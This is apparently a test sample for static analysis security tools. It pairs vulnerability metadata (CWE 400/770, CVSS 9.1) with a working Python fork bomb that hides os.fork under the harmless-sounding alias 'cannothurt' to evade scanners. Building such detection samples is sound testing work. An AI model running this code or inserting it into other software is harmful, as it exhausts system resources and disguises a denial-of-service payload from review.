# SPDX-FileCopyrightText: 2026-present Maikel Mardjan(https://nocomplexity.com/) and all contributors!
# SPDX-License-Identifier: GPL-3.0-or-later
# See for full license text: https://spdx.org/licenses/GPL-3.0-or-later.html or https://opensource.org/license/gpl-3.0 

# A simple forms of identifier renaming / name obfuscation. But most SAST tools fail!
SAST_META = {
    "title": "Fork Bomb Leading to Uncontrolled Resource Consumption",
    "cwe_id": [400, 770],   # 400 Uncontrolled Resource Consumption, 770 Allocation of Resources Without Limits or Throttling
    "weakness": "Uncontrolled Resource Consumption ('Resource Exhaustion')",
    "owasp": "A06:2025 - Insecure Design",
    "severity": "Critical",
    "cvss": 9.1,
    "impact": "High",
    "tags": ["fork-bomb", "dos", "resource-exhaustion", "process-creation",
             "uncontrolled-fork", "denial-of-service", "python"],
}

from os import fork as cannothurt

while True:
   cannothurt()  # Creates a new child process - This is a typical fork bomb

